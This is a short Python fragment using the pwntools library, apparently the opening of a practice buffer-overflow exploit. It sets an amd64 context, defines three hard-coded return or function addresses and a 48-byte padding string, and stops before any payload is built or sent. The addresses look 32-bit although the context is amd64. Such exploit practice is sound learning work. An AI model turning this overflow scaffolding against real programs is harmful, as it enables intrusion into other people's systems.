#!/usr/bin/python
from pwn import *
context.arch = "amd64"

ret_addr = 0x08048500
ori_addr = 0x08048590
pro_addr = 0x08048640

padding = "A" * 48
